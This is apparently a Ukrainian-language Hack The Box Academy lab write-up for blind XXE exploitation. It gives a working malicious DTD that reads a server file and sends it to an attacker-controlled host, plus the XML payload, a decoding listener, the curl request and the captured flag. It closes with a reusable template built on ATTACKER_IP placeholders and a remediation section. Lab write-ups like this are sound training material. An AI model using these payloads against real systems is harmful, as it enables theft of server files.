# Web Attacks — Blind XXE: True Out-of-Band Exfiltration (No Reflected Output)

Модуль: [Web Attacks](https://academy.hackthebox.com/app/module/134)
Секція: [Blind Data Exfiltration](https://academy.hackthebox.com/app/module/134/section/1207)
Ціль: 10.129.79.152 (`/blind/submitDetails.php`)
Відповідь: `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`

## Концепція

На попередньому кроці (`/error`, CDATA-метод) сервер **відображав** результат прямо у відповіді ("Check your email BASE64 for further instructions"). Тут же `/blind/submitDetails.php` навмисно повертає лише статичний текст `Check your email for further instructions.` без жодних даних — це справжній **blind XXE**: немає reflected sink, ми не бачимо вкрадені дані у відповіді сервера взагалі.

Рішення — повністю прибрати залежність від HTTP-відповіді цілі й натомість **ексфільтрувати дані через власний канал**: ціль сама, обробляючи наш зловмисний DTD, робить вихідний (outbound) HTTP-запит на наш сервер, підставляючи вміст вкраденого файлу прямо в GET-параметр URL. Ми просто читаємо цей запит у своїх логах — сервер цілі стає "поштарем", що сам доставляє нам вкрадені дані, без потреби бачити щось у відповіді.

## Схема атаки

```
Ціль парсить XML → підвантажує xxe.dtd з нашого сервера
                     ↓
xxe.dtd визначає %file = base64(вміст секретного .php файлу)
                     ↓
xxe.dtd будує %oob = "<!ENTITY content SYSTEM 'http://ATTACKER:8000/?content=%file;'>"
                     ↓
%oob; розгортається → визначає нову сутність &content;
                     ↓
Ціль сама виконує GET-запит на наш сервер з файлом у query-параметрі
                     ↓
Ми читаємо вкрадені дані прямо з логів свого HTTP-сервера
```

## Крок 1 — DTD-файл з ланцюжком параметричних сутностей

```bash
mkdir ~/xxe_blind && cd ~/xxe_blind

cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.31:8000/?content=%file;'>">
%oob;
EOF
```

Пояснення ключового трюку — **сутність всередині сутності**:
- `%file` читає цільовий файл і кодує в base64 (уникаємо поламання XML символами `<?php ?>`).
- `%oob` — це параметрична сутність, значення якої — **текст іншого `<!ENTITY>` оголошення** з підставленим `%file;` всередині URL. Коли `%oob;` розгортається в DTD, парсер сприймає цей текст як нову декларацію і реально визначає `&content;` = зовнішній ресурс з файлом у query string.
- Виклик `%oob;` в кінці — це те, що фактично "активує" визначення `&content;`.

## Крок 2 — Локальний слухач для прийому ексфільтрованих даних

```bash
php -S 0.0.0.0:8000
```

Пояснення: достатньо простого вбудованого PHP dev-сервера — нам не потрібна логіка обробки, лише факт вхідного запиту з даними в URL. Все, що нам треба, з'явиться прямо в stdout-логах сервера (`GET /?content=BASE64...`).

Опційно (як у вас в index.php) можна додати обробник, що одразу декодує base64 і пише в error_log — корисно, якщо потрібен чистий вивід без ручного копіювання base64-рядка:

```php
<?php
if (isset($_GET['content'])) {
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

## Крок 3 — Основний XML-payload

```bash
cat > ~/payload_blind.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY % remote SYSTEM "http://10.10.15.31:8000/xxe.dtd">
%remote;
%content;
]>
<root>&content;</root>
EOF
```

Важлива деталь: тут ми навмисно **не покладаємось** на те, що `&content;` буде видно у відповіді (`<root>&content;</root>` — це просто формальність для валідного XML, значення в тілі відповіді не має значення). Реальна ексфільтрація відбувається раніше — в момент, коли парсер цілі розгортає `%content;` всередині DTD-секції і сам ініціює вихідний HTTP-запит до нашого сервера.

## Крок 4 — Типові помилки в процесі (і як їх уникнути)

- **`bash: syntax error` / `event not found`** — виникло через спробу вставити XML прямо в shell без heredoc. Правильно — завжди створювати payload через `cat > file << 'EOF' ... EOF`, а не вставляти XML напряму в промпт.
- **`curl: option --data-binary: error encountered when reading a file`** — файл не існував у момент виклику curl (помилка heredoc або відносний шлях); вирішено вказанням повного шляху `/home/htb-ac-2291638/payload_blind.xml`.
- **301 Redirect на `/blind/`** — Apache додає trailing slash до директорій; використали `curl -L` для автоматичного переходу, але фінальний правильний endpoint виявився не `/blind/` (сторінка), а `/blind/submitDetails.php` (той самий JS-driven ендпоінт, що й раніше, лише в іншій піддиректорії) — знайдений через повторний `grep` по `js/main.js` цієї сторінки.

## Крок 5 — Правильний запит на реальний endpoint

```bash
curl -s -X POST "http://10.129.79.152/blind/submitDetails.php" \
  -H "Content-Type: application/xml" \
  --data-binary @/home/htb-ac-2291638/payload_blind.xml
```

Відповідь: `Check your email for further instructions.` — жодних даних, як і очікувалось для blind-сценарію. Це нормально й очікувано — доказ успіху шукаємо не тут.

## Крок 6 — Читаємо вкрадені дані з логів власного сервера

У логах `php -S 0.0.0.0:8000` бачимо два вхідні запити від цілі:
```
[200]: GET /xxe.dtd
[200]: GET /?content=PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K
```

Перший запит — ціль підвантажує наш DTD. Другий — ціль сама передала нам вкрадений файл у своєму власному GET-запиті. Завдяки `error_log()` в `index.php` PHP-сервер відразу декодував і вивів вміст файлу прямо в консоль:

```php
<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
```

## Чому це працює (root cause для звіту)

- **Опис:** Ендпоінт `/blind/submitDetails.php` уразливий до XXE так само, як і `/submitDetails.php`, але навіть повна відсутність reflected output в HTTP-відповіді не запобігає ексфільтрації даних.
- **Технічні деталі:** XML-парсер дозволяє визначати зовнішні параметричні сутності, значення яких саме містить нову декларацію `<!ENTITY>` з URL, що включає результат читання файлу; при розгортанні цього ланцюжка парсер цілі сам ініціює вихідний HTTP GET-запит до контрольованого атакуючим сервера, передаючи вкрадені дані як частину URL.
- **Ризик/Імпакт:** Blind XXE → Out-of-Band Data Exfiltration (CWE-611) — навіть при коректно "засекреченій" (без відображення) поведінці застосунку, довільні файли файлової системи сервера можуть бути викрадені повністю без залежності від видимого виводу; це найнебезпечніший підклас XXE, бо стандартний моніторинг відповідей (grep по HTTP body) не виявить факту компрометації.
- **Рекомендації:** Повне відключення DTD/зовнішніх сутностей на рівні парсера (найефективніший захист від усього класу XXE, включно з OOB); egress filtering — заблокувати вихідні з'єднання від веб-сервера до довільних зовнішніх хостів на рівні firewall, що унеможливить сам факт "телефонного дзвінка додому" навіть при вразливому парсері.

## Швидкий payload на майбутнє (шаблон Blind OOB)

```bash
# xxe.dtd (замінити TARGET_FILE і ATTACKER_IP)
cat > xxe.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=TARGET_FILE">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
%oob;
EOF

# слухач з авто-декодуванням
cat > index.php << 'PHPEOF'
<?php if (isset($_GET['content'])) { error_log("\n\n" . base64_decode($_GET['content'])); } ?>
PHPEOF
php -S 0.0.0.0:8000

# payload
cat > payload_blind.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
%remote;
%content;
]>
<root>&content;</root>
EOF

curl -s -X POST "http://TARGET/submitDetails.php" -H "Content-Type: application/xml" --data-binary @payload_blind.xml
# результат дивимось в логах php -S, а не у відповіді curl
```
